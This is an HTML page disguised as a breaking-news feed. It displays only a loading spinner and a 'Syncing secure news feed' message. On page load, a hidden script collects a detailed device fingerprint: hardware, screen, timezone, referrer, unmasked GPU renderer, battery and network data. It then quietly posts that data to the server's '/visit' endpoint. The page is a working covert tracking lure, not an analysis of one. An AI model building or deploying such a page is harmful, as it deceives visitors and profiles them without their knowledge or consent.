<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Breaking News | Global Feed</title>
  <style>
    body { background: #050505; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .loader { border: 3px solid #333; border-top: 3px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div style="text-align: center;">
    <div class="loader" style="margin: auto;"></div>
    <p>Syncing secure news feed...</p>
  </div>

  <script>
    async function collectFullIntel() {
      const data = {
        // Hardware & CPU
        hw: {
          cores: navigator.hardwareConcurrency || "N/A",
          ram: navigator.deviceMemory || "N/A",
          platform: navigator.platform || "N/A",
          touch: navigator.maxTouchPoints || 0,
          vendor: navigator.vendor || "N/A"
        },
        // Display & Screen
        display: {
          res: `${window.screen.width}x${window.screen.height}`,
          avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
          depth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          orientation: screen.orientation ? screen.orientation.type : "N/A"
        },
        // Browser Environment
        browser: {
          lang: navigator.languages ? navigator.languages.join(', ') : navigator.language,
          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          ref: document.referrer || "Direct",
          cookies: navigator.cookieEnabled,
          webdriver: navigator.webdriver || false,
          java: navigator.javaEnabled()
        }
      };

      // GPU Extraction
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
      } catch (e) { data.gpu = "N/A"; }

      // Battery Status
      try {
        if (navigator.getBattery) {
          const b = await navigator.getBattery();
          data.battery = { lvl: (b.level * 100) + "%", status: b.charging ? "Charging" : "Unplugged" };
        }
      } catch (e) { data.battery = "N/A"; }

      // Network Info
      if (navigator.connection) {
        data.net = {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink + " Mbps",
          rtt: navigator.connection.rtt + " ms"
        };
      }

      // Send to server
      fetch("/visit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
    }
    window.onload = collectFullIntel;
  </script>
</body>
</html>
